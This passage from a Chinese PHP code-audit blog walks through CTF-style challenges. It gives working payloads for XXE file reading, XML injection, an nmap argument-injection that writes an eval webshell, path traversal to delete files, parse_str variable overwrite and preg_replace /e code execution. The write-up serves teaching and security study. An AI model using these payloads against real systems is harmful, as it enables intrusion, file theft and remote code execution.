+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func_array</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">class_exists</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">class_implements</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">class_parents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">class_uses</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">get_class_methods</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">get_class_vars</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">get_parent_class</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">interface_exists</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">is_a</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">is_callable</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">is_subclass_of</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">method_exists</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">property_exists</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">spl_autoload_call</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">trait_exists</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure>
+<p>​    倘若实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类来进一步攻击。</p>
+<p>其中就可以利用<code>SimpleXMLElement</code>来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect）</p>
+<p> <code>SimpleXMLElement</code> 类的定义：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p>
+</blockquote>
+<p>下面这一道CTF题目就可以利用php内置类来进行攻击读取flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// index.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);<br>    &#125;<br>&#125;<br>spl_autoload_register(<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;<br>        <span class="hljs-keyword">new</span> NotFound();<br>    &#125;<br>);<br><span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;<br>    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);<br>    var_dump(<span class="hljs-variable">$newclass</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>我们可以从这段代码看到，$classname和$param、param2都是我们可以控制的，但是在本程序中并没有像<code>__autoload()</code>那样的方法。</p>
+<p>但是我们可以利用php的一些内置类来帮我们实现拿到flag的作用。</p>
+<p><code>GlobIterator</code>类（遍历一个文件系统行为类似于 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.glob.php">glob()</a>.），可以用来进行文件搜索</p>
+<p>payload:</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">?name=GlobIterator&amp;param=<span class="hljs-string">./</span>*<span class="hljs-string">.php</span>&amp;param2=0<br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/9.png" srcset="/img/loading.gif"></p>
+<p>我们要读取flag.php里面的内容可以利用<code>SimpleXMLElement</code>进行XXE攻击读取flag.php里的内容。</p>
+<p>payload:</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">foo</span> [<span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">foo</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>%26xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span>&amp;param2=2</span><br><br><br><span class="xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=./flag.php&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span>%26xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>&amp;param2=2</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/10.png" srcset="/img/loading.gif"></p>
+<h3 id="4-Day04-strpos使用不当引发xml注入漏洞"><a href="#4-Day04-strpos使用不当引发xml注入漏洞" class="headerlink" title="4.Day04(strpos使用不当引发xml注入漏洞)"></a>4.Day04(strpos使用不当引发xml注入漏洞)</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/11.png" srcset="/img/loading.gif"></p>
+<p>​    我们看到 <strong>第12行</strong> 和 <strong>第13行</strong> ，程序通过格式化字符串的方式，使用 <strong>xml</strong> 结构存储用户的登录信息。实际上这样很容易造成数据注入。</p>
+<p>​    在<strong>第22行</strong> 实例化 <strong>Login</strong> 类，并在 <strong>第17行</strong> 处调用 <strong>login</strong> 方法进行登陆操作。</p>
+<p>​    在进行登录操作之前，代码在 <strong>第8行</strong> 至 <strong>第10行</strong> 使用 <strong>strpos</strong> 函数来防止输入的参数含有 <strong>&lt;** 和 **&gt;</strong> 符号，开发者希望通过这个来杜绝恶意代码的注入。</p>
+<p>我们先来看一下 <strong>strpos</strong> 函数的定义：</p>
+<p><strong><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.strpos.php">strpos</a></strong> — 查找字符串首次出现的位置</p>
+<p>作用：主要是用来查找字符在字符串中首次出现的位置。</p>
+<p>结构：<code>int strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )</code></p>
+<p>若是$haystack字符串存在$needle变量中的字符，便会返回字符在字符串中首次出现的位置，若是没有找到则会返回<code>false</code>，但如果$needle变量中的字符在字符串的第一个位置也就是0的时候，该函数则会返回int(0)，通过php弱类型比较我们可以知道（var_dump(0==false) 返回的是true），同时!0也是返回true的，因此可以通过该缺陷绕过这个防御措施。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/12.png" srcset="/img/loading.gif"></p>
+<p>这道题的核心突破点在这里：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$user</span> != <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-variable">$pass</span> != <span class="hljs-literal">false</span> &amp;&amp;<br>(!strpos(<span class="hljs-variable">$user</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>) || !strpos(<span class="hljs-variable">$user</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>)) &amp;&amp;<br>(!strpos(<span class="hljs-variable">$pass</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>) || !strpos(<span class="hljs-variable">$pass</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>))<br></code></pre></td></tr></table></figure>
+<p>利用开发者对<code>strpos()</code>的使用不当，我们可以进行xml注入。比如添加一个新的管理员帐号啥的。。。。。</p>
+<p>payload:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=&lt;<span class="hljs-string">&quot;&gt;&lt;injected-tag%20property=&quot;</span>&amp;password=&lt;<span class="hljs-string">&quot;&gt;&lt;injected-tag%20property=&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+<h3 id="5-Day05-escapeshellarg与escapeshellcmd使用不当"><a href="#5-Day05-escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="5.Day05(escapeshellarg与escapeshellcmd使用不当)"></a>5.Day05(escapeshellarg与escapeshellcmd使用不当)</h3><p>这一题我打算用buu平台上的这一题<code>[BUUCTF 2018]Online Tool</code>的来进行，毕竟做过（滑稽）</p>
+<p>这一题开发者本意是要让我们传入一个host/ip，然后调用nmap去扫描我们传入的host/ip参数值，但是作为入侵者肯定不会这样老实的传入规规矩矩的参数值的。这一题就是利用escapeshellarg和escapeshellcmd这两个函数使用不恰当，逃逸特殊字符，然后执行我们想要的恶意参数代码。</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/13.png" srcset="/img/loading.gif"></h3><p>写个demo来测试一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$evil</span> = <span class="hljs-string">&quot;127.0.0.1 &#x27; -d 1 -a=1&quot;</span>;<br><span class="hljs-variable">$evil1</span> = escapeshellarg(<span class="hljs-variable">$evil</span>);<br><span class="hljs-variable">$evil2</span> = escapeshellcmd(<span class="hljs-variable">$evil1</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;curl &quot;</span>.<span class="hljs-variable">$evil2</span>;<br>var_dump(<span class="hljs-variable">$evil1</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>var_dump(<span class="hljs-variable">$evil2</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>system(<span class="hljs-variable">$shell</span>);<br></code></pre></td></tr></table></figure>
+<p>我们先传入一个正常的参数127.0.0.1，我们可以发现他会将我们的参数值用单引号包裹起来再拼接。</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/17.png" srcset="/img/loading.gif"></p>
+<p>倘若我们想要利用nmap的-oG参数，传入<code>&lt;?php @eval($_POST[reader]);?&gt; -oG hack.php</code>，最终肯定也会被单引号包裹成为一个普通的字符串，无法调用执行。如下</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/18.png" srcset="/img/loading.gif"></p>
+<p>因此我们需要想办法，让<code>-oG</code>成为nmap的一个选项，因此我们需要传入单引号来闭合，进而让-oG成为一个选项，我们就利用escapeshellarg与escapeshellcmd使用不当来逃逸单引号。</p>
+<h4 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h4><p>我们来看一下php手册对这两个关键函数的定义</p>
+<blockquote>
+<p>escapeshellarg<br>(PHP 4 &gt;= 4.0.3, PHP 5, PHP 7)</p>
+<p>escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p>
+<p>说明<br>escapeshellarg ( string $arg ) : string<br>escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。</p>
+</blockquote>
+<blockquote>
+<p>escapeshellcmd<br>(PHP 4, PHP 5, PHP 7)</p>
+<p>escapeshellcmd — shell 元字符转义</p>
+<p>说明<br>escapeshellcmd ( string $command ) : string<br>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
+</blockquote>
+<p>demo.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$evil</span> = <span class="hljs-string">&quot;127.0.0.1 &#x27; -d 1 -a=1&quot;</span>;<br><span class="hljs-variable">$evil1</span> = escapeshellarg(<span class="hljs-variable">$evil</span>);<br><span class="hljs-variable">$evil2</span> = escapeshellcmd(<span class="hljs-variable">$evil1</span>);<br><span class="hljs-variable">$shell</span> = <span class="hljs-string">&quot;curl &quot;</span>.<span class="hljs-variable">$evil2</span>;<br>var_dump(<span class="hljs-variable">$evil1</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>var_dump(<span class="hljs-variable">$evil2</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>system(<span class="hljs-variable">$shell</span>);<br></code></pre></td></tr></table></figure>
+<p>详细分析一下这个过程：</p>
+<ol>
+<li><p>传入的参数是</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>&#x27; -v -d a=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li>
+<li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1&#x27;<br></code></pre></td></tr></table></figure></li>
+<li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;<br></code></pre></td></tr></table></figure></li>
+<li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符</p>
+</li>
+</ol>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/14.png" srcset="/img/loading.gif"></p>
+<p>我们根据以上的分析尝试以下payload</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">payload:</span><br><span class="xml">?host=&#x27; </span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[reader]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;</span><br><br><br><span class="xml">经过escapeshellarg()：&#x27;&#x27;\&#x27;&#x27; </span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[reader]);<span class="hljs-meta">?&gt;</span></span><span class="xml"> -oG hack.php &#x27;\&#x27;&#x27;&#x27;</span><br><br><br><br><span class="xml">经过escapeshellcmd()：&#x27;&#x27;\\&#x27;&#x27; \&lt;\?php @eval\(\$_POST\[reader\]\)\;\?\&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27;</span><br><br><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/15.png" srcset="/img/loading.gif"></p>
+<p>写入webshell</p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/16.png" srcset="/img/loading.gif"></p>
+<h3 id="6-Day06-正则使用不当导致的路径穿越问题"><a href="#6-Day06-正则使用不当导致的路径穿越问题" class="headerlink" title="6.Day06(正则使用不当导致的路径穿越问题)"></a>6.Day06(正则使用不当导致的路径穿越问题)</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/19.png" srcset="/img/loading.gif"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 4, PHP 5, PHP 7)</p>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功将其替换成 <strong>replacement</strong> 。    </p>
+</blockquote>
+<p>这关的漏洞是在代码23行的，正则使用不当，该 <strong>preg_replace</strong> 中的 <strong>pattern</strong> 部分 ，该正则表达式并未起到过滤目录路径字符的作用。<code>[^a-z.-_]</code> 表示匹配除了 <strong>a</strong> 字符到 <strong>z</strong> 字符、**.** 字符到 <strong>_</strong> 字符之间的所有字符。因此，攻击者还是可以使用点和斜杠符号进行路径穿越，最终删除任意文件。</p>
+<p>payload: <code>?action=delete&amp;data=../../test.txt</code></p>
+<h3 id="7-Day07-parse-str函数缺陷"><a href="#7-Day07-parse-str函数缺陷" class="headerlink" title="7.Day07(parse_str函数缺陷)"></a>7.Day07(parse_str函数缺陷)</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/21.png" srcset="/img/loading.gif"></p>
+<p>漏洞函数是parse_str</p>
+<blockquote>
+<h1 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str"></a>parse_str</h1><p>(PHP 4, PHP 5, PHP 7)</p>
+<p>parse_str — 将字符串解析成多个变量</p>
+<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>parse_str ( string <code>$encoded_string</code> [, array <code>&amp;$result</code> ] ) : void</p>
+<p>如果 <code>encoded_string</code> 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 <code>result</code> 则会设置到该数组里 ）。</p>
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
+<li><p><code>encoded_string</code></p>
+<p>输入的字符串。</p>
+</li>
+<li><p><code>result</code></p>
+<p>如果设置了第二个变量 <code>result</code>， 变量将会以数组元素的形式存入到这个数组，作为替代。<strong>Warning</strong>极度<em>不建议</em> 在没有 <code>result</code> 参数的情况下使用此函数，并且在 PHP 7.2 中将<em>废弃</em>不设置参数的行为。在函数中动态设置变量会和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals">register_globals</a> 有同样的问题。阅读「安全」中 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/security.globals.php">使用 Register Globals</a> 的章节，解释了它为什么是危险的。</p>
+</li>
+</ul>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>没有返回值。</p>
+</blockquote>
+<p>​    </p>
+<p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/22.png" srcset="/img/loading.gif"></p>
+<p>​    这一关其实是考察变量覆盖漏洞，⽽导致这⼀漏洞的发⽣则是不安全的使⽤ <strong>parse_str</strong> 函数。 由于 <strong>第25行</strong> 中的 <strong>parse_str()</strong> 调用，其行为非常类似于注册全局变量。我们通过提交类似<strong>config[dbhost]=127.0.0.1</strong> 这样类型的数据，这样因此我们可以控制 <strong>getUser()</strong> 中第9到12行的全局变量 <strong>$config</strong> 。如果目标存在登陆验证的过程，那么我们就可以通过变量覆盖的方法，远程连接我们自己设置的mysql服务器，从而绕过这块的登陆验证。</p>
+<p>payload:</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/html/day7.php?config</span>[<span class="hljs-string">dbhost</span>]=127.0.0.1&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=test&amp;id=1<br></code></pre></td></tr></table></figure>
+
+
+<h3 id="8-Day08-preg-replace函数之命令执行"><a href="#8-Day08-preg-replace函数之命令执行" class="headerlink" title="8.Day08( preg_replace函数之命令执行)"></a>8.Day08( preg_replace函数之命令执行)</h3><p><img src="/2020/05/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B0%8F%E6%8C%91%E6%88%98/23.png" srcset="/img/loading.gif"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.preg-replace.php"><strong>preg_replace</strong></a>：(PHP 5.5)</p>
+<p><strong>功能</strong> ： 函数执行一个正则表达式的搜索和替换</p>
+<p><strong>定义</strong> ： <code>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</code></p>
+<p>搜索 <strong>subject</strong> 中匹配 <strong>pattern</strong> 的部分， 如果匹配成功以 <strong>replacement</strong> 进行替换</p>
+</blockquote>
+<ul>
+<li><strong>$pattern</strong> 存在 <strong>/e</strong> 模式修正符，允许代码执行</li>
+<li><strong>/e</strong> 模式修正符，是 <strong>preg_replace() \</strong> 将 **$replacement** 当做php代码来执行</li>
+</ul>
+<p>漏洞代码在图中10～14行，其中preg_replace()函数中的第一个和第三个参数是我们可以控制的，但是可以被当作代码执行的第二个参数固定是<code>strtolower(&quot;\\1&quot;)</code>。看了文章，发现这里涉及到正则表达式反向引用的知识。</p>
+<p>在<a target="_blank" rel="noopener" href="https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html">W3Cschool</a>有相关介绍</p>
+<blockquote>
+<p>对一个正则表达式模式或部分模式两边添加圆括号将导致相关匹配存储到一个临时缓冲区中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+</blockquote>
+<p><code>\1</code> 指定第一个子匹配项。</p>
+<p>官方 <strong>payload</strong> 为： <strong>/?.*={${phpinfo()}}</strong> ，即 <strong>GET</strong> 方式传入的参数名为 <strong>.*</strong> ，值为 <strong>{${phpinfo()}}</strong> 。</p>
+<p>至于为什么用<code>&#123;$&#123;phpinfo()&#125;&#125;</code>，可以看这篇文章<a target="_blank" rel="noopener" href="https://foxgrin.github.io/posts/41464/">https://foxgrin.github.io/posts/41464/</a></p>
+<p>demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$regex</span> = <span class="hljs-string">&#x27;.*&#x27;</span>;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>;<br><span class="hljs-comment">//    $value = &#x27;phpinfo()&#x27;;</span><br>    preg_replace(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-variable">$value</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>本地测试，是成功的。</p>
